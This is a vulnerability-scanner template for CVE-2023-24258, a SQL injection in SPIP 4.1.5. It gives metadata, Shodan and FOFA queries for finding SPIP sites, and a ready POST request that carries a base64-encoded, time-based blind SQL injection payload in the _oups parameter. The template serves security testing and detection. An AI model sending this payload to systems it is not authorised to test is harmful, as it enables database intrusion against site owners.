id: CVE-2023-24258

info:
  name: SPIP 4.1.5 SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: SPIP v4.1.5 and earlier was discovered to contain a SQL injection vulnerability via the _oups parameter.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Apply the latest security patch provided by SPIP to mitigate the SQL Injection vulnerability.
  reference:
    - https://blog.spip.net/Mise-a-jour-de-securite-sortie-de-SPIP-4-1-7-SPIP-4-0-9-et-SPIP-3-2-17.html
    - https://www.debian.org/security/2023/dsa-5325
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-24258
    cwe-id: CWE-89
    epss-score: 0.00175
    epss-percentile: 0.55813
    cpe: cpe:2.3:a:spip:spip:*:*:*:*:*:*:*:*
  metadata:
    vendor: spip
    product: spip
    shodan-query: html:"spip.php?page=backend"
    fofa-query:
      - app="spip"
      - body="spip.php?page=backend"

http:
  - method: POST
    path:
      - "{{BaseURL}}/ecrire/?exec=article&id_article=1"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    body: |
      var_ajax=form&exec=article&id_article=1&formulaire_action=editer_liens&formulaire_action_args={{formulaire_action_args}}&formulaire_action_sign={{formulaire_action_sign}}&visible=0&debutautl=&annuler_oups=Ooops&_oups=W3sib2JqZXQiOiJhcnRpY2xlIiwiYXV0ZXVyIjoiMSIsImFydGljbGUiOiIxIiwidnU9JycgT1IgaWYoKHN1YnN0cih1c2VyKCksMSwxKSAhPSAxKSwgc2xlZXAoNSksIHNsZWVwKDUpKSAjIjoiIn1d
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
